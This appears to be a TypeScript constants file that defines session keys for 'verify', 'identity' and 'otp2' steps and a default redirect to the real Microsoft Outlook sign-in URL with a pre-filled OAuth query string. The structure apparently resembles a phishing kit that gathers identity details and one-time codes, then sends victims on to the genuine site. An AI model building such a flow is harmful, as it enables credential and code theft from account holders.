export const FLORES_SESSION = {
  verify: "flores_verify",
  identity: "flores_identity",
  otp2: "flores_otp2",
} as const;

export const FLORES_REDIRECT_URL =
  process.env.NEXT_PUBLIC_REDIRECT_URL ??
  "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=9199bf20-a13f-4107-85dc-02114787ef48&scope=https%3A%2F%2Foutlook.office.com%2F.default%20openid%20profile%20offline_access&redirect_uri=https%3A%2F%2Foutlook.live.com%2Fmail%2F&client-request-id=3dede2fd-f3a4-31b6-9408-c92dabd3a4bf&response_mode=fragment&client_info=1&clidata=1&prompt=select_account&nonce=019f04cd-8533-77db-b565-c7586e8822d4&state=eyJpZCI6IjAxOWYwNGNkLTg1MzMtNzg4Zi04NmU1LTExOTRmYTU5NjE5NSIsIm1ldGEiOnsiaW50ZXJhY3Rpb25UeXBlIjoicmVkaXJlY3QifX0%3D%7CaHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvP2RlZXBsaW5rPW1haWwlMkZpbmJveCUyRmlkJTJGQVFRa0FEQXdBVE0wTURBQU1pMWhNakE0TFRrMlpERXRNREFDTFRBd0NnQVFBT0dvRU92SDJEVktnJTJGNWxzNmZrbGNJJTNEJTNGZGVlcGxpbmslM0RtYWlsJTJGaW5ib3glMkZpZCUyRkFRUWtBREF3QVRNME1EQUFNaTFoTWpBNExUazJaREV0TURBQ0xUQXdDZ0FRQUxvQmZaanVpck5OckZ3OUhPQUxCOWslM0Q&claims=%7B%22access_token%22%3A%7B%22xms_cc%22%3A%7B%22values%22%3A%5B%22CP1%22%5D%7D%7D%7D&x-client-SKU=msal.js.browser&x-client-VER=5.12.0&response_type=code&code_challenge=xhvloHSAqxBU4ae7hPYqFopJ-FKgOTDjpBMb3JLGCTo&code_challenge_method=S256&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&fl=dob%2Cflname%2Cwld&sso_reload=true";
